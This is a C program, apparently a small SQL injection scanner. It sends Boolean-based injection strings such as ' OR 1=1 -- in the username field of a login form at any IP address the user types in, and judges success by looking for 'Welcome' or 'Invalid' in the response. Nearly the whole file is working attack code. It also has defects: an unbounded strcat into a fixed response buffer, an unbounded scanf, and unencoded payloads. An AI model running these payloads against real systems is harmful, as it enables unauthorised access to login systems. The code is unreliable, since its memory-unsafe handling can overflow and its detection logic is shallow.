#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Function to write the response data to a string buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data) {
    strcat(data, ptr); // Append the response to the buffer
    return size * nmemb;
}

// Function to detect Boolean-Based SQL Injection by analyzing the response
void detect_boolean_sql_injection(const char *ip_address) {
    printf("Checking for potential Boolean-Based SQL Injection on %s...\n", ip_address);

    // SQL injection payloads for Boolean-based SQL Injection
    const char *payloads[] = {
        "' OR 1=1 --",   // Always true condition
        "' OR 1=2 --",   // Always false condition
        "' AND 1=1 --",  // Always true condition with AND
        "' AND 1=2 --",  // Always false condition with AND
        "' OR 'a'='a' --",// Always true condition (alternative format)
        "' OR 'a'='b' --",// Always false condition (alternative format)
    };

    // Target URL for testing (e.g., a login page or search endpoint)
    char url[256];
    snprintf(url, sizeof(url), "http://%s/login", ip_address);  // Adjust the URL accordingly

    CURL *curl;
    CURLcode res;
    for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        char data[256];
        snprintf(data, sizeof(data), "username=%s&password=password", payloads[i]);

        // Initialize libcurl
        curl = curl_easy_init();
        if (curl) {
            // Set up curl options
            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");

            // Set the URL and POST data
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

            // Create a buffer to store the response
            char response[1024] = {0};
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

            // Perform the request
            res = curl_easy_perform(curl);

            // Check if the request was successful
            if (res != CURLE_OK) {
                fprintf(stderr, "[!] Error making request: %s\n", curl_easy_strerror(res));
            } else {
                // Check for successful injection based on response content
                if (strstr(response, "Welcome") && strcmp(payloads[i], "' OR 1=1 --") == 0) {
                    printf("[!] Boolean-Based SQL Injection detected with payload: %s\n", payloads[i]);
                    printf("Response contains 'Welcome' message (indicating login success).\n");
                } else if (strstr(response, "Invalid") && strcmp(payloads[i], "' OR 1=2 --") == 0) {
                    printf("[!] Boolean-Based SQL Injection detected with payload: %s\n", payloads[i]);
                    printf("Response contains 'Invalid' message (indicating login failure).\n");
                } else {
                    printf("[+] No Boolean-based SQL Injection detected with payload: %s\n", payloads[i]);
                }
            }

            // Cleanup
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
        }
    }
}

// Main function to prompt the user and start the detection process
int main() {
    printf("================= Boolean-Based SQL Injection Detection Tool =================\n");

    // Prompt the user for an IP address to test for Boolean SQL Injection
    char ip_address[100];
    printf("Enter the target IP address:");
    scanf("%s", ip_address);

    // Start detecting Boolean-Based SQL Injection
    detect_boolean_sql_injection(ip_address);

    return 0;
}
